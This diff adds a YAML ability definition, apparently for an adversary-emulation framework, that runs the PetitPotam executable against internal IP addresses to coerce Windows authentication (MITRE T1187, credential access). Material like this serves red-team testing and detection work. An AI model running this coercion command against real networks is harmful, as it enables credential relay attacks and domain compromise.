@@ -1,0 +1,21 @@
+---
+- id: 608b7021a5b8369e9fd858feba6f5611
+  name: PetitPotam
+  description: 'This module runs the Windows executable of PetitPotam in order to
+    coerce authentication for a remote system.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1187
+    name: Forced Authentication
+  platforms:
+    windows:
+      psh:
+        command: '& "PathToAtomicsFolder\..\ExternalPayloads\PetitPotam.exe" 10.0.0.3
+          10.0.0.2 1; Write-Host "End of PetitPotam attack"'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
